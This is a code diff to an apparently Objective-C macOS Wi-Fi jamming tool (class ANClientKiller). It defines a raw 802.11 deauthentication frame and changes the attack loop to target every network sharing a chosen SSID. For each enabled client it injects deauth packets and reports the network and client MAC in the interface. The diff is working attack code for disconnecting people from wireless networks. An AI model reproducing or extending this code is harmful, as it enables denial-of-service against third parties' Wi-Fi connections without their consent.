@@ -9,6 +9,8 @@
 #import "ANClientKiller.h"
 #import "ANAppDelegate.h"
 #import "ANTrafficGatherer.h"
+#import "Globals.h"
+#import "Output.h"
 
 #define DEAUTH_REQ \
 "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
@@ -23,8 +25,18 @@
         [sniffer setDelegate:self];
         [sniffer start];
         
+        //find networks with the same SSID
+        NSMutableArray *newNets = @[].mutableCopy;
+        for (CWNetwork *net in Globals.instance.nets) {
+            for (CWNetwork *targetNet in networks) {
+                if([targetNet.ssid isEqualToString:net.ssid]){
+                    [newNets addObject:net];
+                }
+            }
+        }
+        
         NSMutableArray * mChannels = [[NSMutableArray alloc] init];
-        for (CWNetwork * net in networks) {
+        for (CWNetwork * net in newNets) {
             if (![mChannels containsObject:net.wlanChannel]) {
                 [mChannels addObject:net.wlanChannel];
             }
@@ -184,18 +196,32 @@
     }
     CWChannel * channel = [channels objectAtIndex:channelIndex];
     [sniffer setChannel:channel];
+    
+    
     // deauth all clients on all networks on this channel
     NSArray * networks = [networksForChannel objectForKey:channel];
-    for (ANClient * client in clients) {
-        if (![client enabled]) continue;
-        for (CWNetwork * network in networks) {
-            unsigned char bssid[6];
-            copyMAC([network.bssid UTF8String], bssid);
+    for (CWNetwork * network in networks) {
+        unsigned char bssid[6];
+        copyMAC([network.bssid UTF8String], bssid);
+        dispatch_async(dispatch_get_main_queue(), ^{
+            NSString *networkDesc = [NSString stringWithFormat:@"Network: %@, Channel: %d, BSSID: %s", network.ssid, (int)channel.channelNumber, [network.bssid UTF8String]];
+            Output.instance.networkLabel.stringValue = networkDesc;
+        });
+        for (ANClient * client in clients) {
+            if (![client enabled]) continue;
             AN80211Packet * packet = [self deauthPacketForBSSID:bssid client:client.macAddress];
             [sniffer writePacket:packet];
             client.deauthsSent += 1;
+            NSString *clientMac = MACToString(client.macAddress);
+            dispatch_async(dispatch_get_main_queue(), ^{
+                NSLog(clientMac);
+                NSString *clientDesc = [NSString stringWithFormat:@"Client: %@", clientMac];
+                Output.instance.clientLabel.stringValue = clientDesc;
+            });
         }
+        
     }
+    
     [infoTable reloadData];
 }
 
